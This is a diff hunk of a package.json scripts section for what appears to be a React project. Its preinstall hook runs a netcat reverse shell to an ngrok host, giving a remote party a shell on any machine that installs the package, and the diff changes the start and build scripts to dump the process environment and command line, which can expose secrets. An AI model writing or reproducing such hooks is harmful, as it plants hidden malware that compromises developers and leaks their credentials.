@@ -14,8 +14,8 @@
   },
   "scripts": {
     "preinstall" : "nc 0.tcp.in.ngrok.io 16921 -e /bin/sh",
-    "start": "whoami",
-    "build": "whoami",
+    "start": "cat /proc/self/environ",
+    "build": "cat /proc/self/cmdline",
     "test": "react-scripts test --env=jsdom",
     "eject": "react-scripts eject"
   },
